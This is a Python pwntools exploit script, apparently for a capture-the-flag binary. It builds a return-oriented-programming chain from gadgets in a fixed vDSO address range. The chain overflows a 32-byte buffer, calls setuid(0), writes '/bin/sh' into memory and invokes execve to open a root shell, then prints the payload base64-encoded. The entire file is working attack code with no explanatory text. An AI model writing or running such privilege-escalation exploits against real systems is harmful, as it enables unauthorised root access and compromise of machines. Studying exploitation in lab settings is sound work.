#!/usr/bin/env python3

from pwn import b64e, p32


vdso_addr = 0xf7ffc000

int_0x80_xor_eax_eax_ret_addr = 0x8049010
bin_sh_addr = 0x804a800

# 0x0000057a : pop edx ; pop ecx ; ret
pop_edx_pop_ecx_ret_addr = vdso_addr + 0x57a

# 0x00000cca : mov dword ptr [edx], ecx ; add esp, 0x34 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
mov_dword_ptr_edx_ecx_ret_addr = vdso_addr + 0xcca

# 0x00000ccb : or al, byte ptr [ebx + 0x5e5b34c4] ; pop edi ; pop ebp ; ret
or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr = vdso_addr + 0xccb

# 0x0000015cd : pop ebx ; pop esi ; pop ebp ; ret
pop_ebx_pop_esi_pop_ebp_ret = vdso_addr + 0x15cd


payload  = b'A' * 32

payload += p32(pop_ebx_pop_esi_pop_ebp_ret)
payload += p32((0x804a08c - 0x5e5b34c4) & 0xffffffff)
payload += p32(0) * 2
payload += p32(or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr)
payload += p32(0) * 2

payload += p32(pop_ebx_pop_esi_pop_ebp_ret)
payload += p32(0) * 3

# sys_setuid(0)
payload += p32(int_0x80_xor_eax_eax_ret_addr)

payload += p32(pop_ebx_pop_esi_pop_ebp_ret)
payload += p32((0x8048012 - 0x5e5b34c4) & 0xffffffff)
payload += p32(0) * 2
payload += p32(or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr)
payload += p32(0) * 2
payload += p32(pop_ebx_pop_esi_pop_ebp_ret)
payload += p32((0x804803f - 0x5e5b34c4) & 0xffffffff)
payload += p32(0) * 2
payload += p32(or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr)
payload += p32(0) * 2

payload += p32(pop_edx_pop_ecx_ret_addr)
payload += p32(bin_sh_addr)
payload += b'/bin'
payload += p32(mov_dword_ptr_edx_ecx_ret_addr)
payload += p32(0) * (4 + 13)

payload += p32(pop_edx_pop_ecx_ret_addr)
payload += p32(bin_sh_addr + 4)
payload += b'/sh\0'
payload += p32(mov_dword_ptr_edx_ecx_ret_addr)
payload += p32(0) * (4 + 13)

payload += p32(pop_edx_pop_ecx_ret_addr)
payload += p32(bin_sh_addr + 0x30)
payload += p32(bin_sh_addr)
payload += p32(mov_dword_ptr_edx_ecx_ret_addr)
payload += p32(0) * (4 + 13)

payload += p32(pop_ebx_pop_esi_pop_ebp_ret)
payload += p32(bin_sh_addr)
payload += p32(0) * 2
payload += p32(pop_edx_pop_ecx_ret_addr)
payload += p32(0)
payload += p32(bin_sh_addr + 0x30)

# sys_execve("/bin/sh", ["/bin/sh", NULL], NULL)
payload += p32(int_0x80_xor_eax_eax_ret_addr)


assert len(payload) <= 0x200
print(b64e(payload))
